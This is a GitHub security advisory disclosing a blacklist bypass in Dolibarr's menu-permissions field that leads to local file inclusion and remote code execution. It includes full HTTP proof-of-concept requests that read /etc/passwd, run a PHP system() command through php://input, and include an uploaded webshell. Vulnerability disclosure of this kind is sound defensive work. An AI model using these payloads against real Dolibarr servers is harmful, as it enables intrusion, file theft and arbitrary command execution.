# [H] Dolibarr has Remote Code Execution Vulnerability (Bypass)

## Summary
Severity: High
Advisory: GHSA-49xw-hw94-fmv2
CWE: CWE-98
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-07-21
Source: https://github.com/advisories/GHSA-49xw-hw94-fmv2
Type: github-advisory

## Affected
- Packagist: `dolibarr/dolibarr` — affected >=0

## Details
# Summary

The Dolibarr backend provides the function of adding Menu, and supports setting permissions for the added Menu:

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164114688.png)

This is the trigger point of the vulnerability. The submitted permission can be php code, and it will be executed when viewing the created Menu:

- htdocs/admin/menus/edit.php

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164445656.png)

As you can see, in edit.php, if the created menu is set to `$menu->perms`, the `dol_eval()` method will be called. Following the `dol_eval()` method, we can see that it will filter the dangerous php functions in `$menu->perms` through the blacklist set in `$forbiddenphpfunctions`:

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164725548.png)

However, the blacklist here is not comprehensive. For example, the `include_once` and `require_once` functions can easily pass the blacklist check, which will cause file inclusion vulnerabilities. Moreover, if the `allow_url_include` option is enabled in php.ini, arbitrary code execution will occur. **The most serious thing is that we can cooperate with the file upload at `/htdocs/user/document.php?id=1&uploadform=1` to achieve more general arbitrary code execution.**

# Proof of Concept

## Local File Inclusion

(1) First, create a Menu and set "Permissions" to `include_once('/etc/passwd')` (note that `''` must be used here because `"` will be detected):

```http
POST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1
Host: 192.168.31.31
Content-Length: 210
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.31
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Cookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd
Connection: close

token=fae63868ce9c2a7eece04a49ffdbe23f&menu_handler=all&user=2&type=top&propertymainmenu=test1test&titre=test1test&url=test1test&langs=&position=100&target=&enabled=1&perms=include_once('/etc/passwd')&save=Save
```

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165411557.png)

(2) Then we look at the Menu we just created, and we can see that the contents of `/etc/passwd` have been successfully read out:

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165517668.png)

## Remote Code Execution - 1

(1) We first ensure that the `allow_url_include` option of php.ini on the server is `On`:

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228160154464.png)

At this point, we can use remote file inclusion and cooperate with `php://input` to achieve arbitrary code execution.

(2) Create a Menu and set "Permissions" to `include_once('php://input')` (note that `''` must be used here because `"` will be detected):

```http
POST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1
Host: 192.168.31.31
Content-Length: 210
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.31
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Cookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd
Connection: close

token=fae63868ce9c2a7eece04a49ffdbe23f&menu_handler=all&user=2&type=top&propertymainmenu=test1test&titre=test1test&url=test1test&langs=&position=100&target=&enabled=1&perms=include_once('php://input')&save=Save
```

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165822802.png)

(3) Finally, the system command is successfully executed through the POST request:

```http
POST http://192.168.31.31/htdocs/admin/menus/edit.php?menu_handler=all&action=edit&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=24 HTTP/1.1
Host: 192.168.31.31
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.31
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.31/index.php?url=/etc/passwd
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Cookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd
Connection: close

<?php system('ls -al /');?>
```

![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165923443.png)

## Remote Code Execution - 2 (File Inclusion with file upload)

At this point, we are absolutely sure that a file inclusion vulnerability can be achieved by setting "Permissions", and arbitrary code execution can be achieved with `allow_url_include = On`. However, the setting `allow_url_include = On` does not exist on every server. Therefore, to achieve the purpose of universal arbitrary code execution, we need to cooperate with the file upload (without suffix) function.

(1) We can upload a file containing php webshell code through the "Attach a new file/document" function in `/htdocs/user/document.php?id=1&uploadform=1`. The file name is "shell" (this file There must be no suffix, otherwise the detection of `.` by `dol_eval()` cannot be bypassed when setting "Permissions" later. Among all file upload points, only "Attach a new file/document" can be Upload files without suffix):

![image-20240228232622397](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228232622397.png)

(2) upload the "shell":

![image-20240228231150328](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231150328.png)

Images uploaded from here will eventually be saved on the server in the "/var/www/html/documents/users/1/" directory:

![image-20240228230738376](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228230738376.png)

（3）create a Menu and set "Permissions" to `include_once('/var/www/html/documents/users/1/shell')` (note that `''` must be used here because `"` will be detected).

```http
POST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1
Host: 192.168.31.31
Content-Length: 210
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.31
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Cookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd
Connection: close

token=e71337659d7cbae16b0279b4e04535aa&menu_handler=all&user=2&type=left&propertymainmenu=whaoamia&menuIdParent=123&titre=whaoamia&picto=whaoamia&url=whaoamia&langs=&position=100&enabled=1&perms=include_once('/var/www/html/documents/users/1/shell')&target=&save=Save
```

(4) Finally, when we access the Menu we just created, we can find that the "/var/www/html/documents/users/1/shell" file is included:

![image-20240228231800914](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231800914.png)

Finally, arbitrary code execution was successfully achieved:

![image-20240228231703417](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231703417.png)

![image-20240228232116013](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228232116013.png)

# Impact

This vulnerability can run arbitrary commands in the file system and read sensitive files.

# Say it at the end

If you confirm the vulnerability, please apply for a CVE to notify all users to update.

## References
- https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-49xw-hw94-fmv2
- https://github.com/Dolibarr/dolibarr
- https://github.com/Dolibarr/dolibarr/blob/21.0.2/htdocs/admin/menus/edit.php
- https://github.com/Dolibarr/dolibarr/blob/21.0.2/htdocs/user/document.php
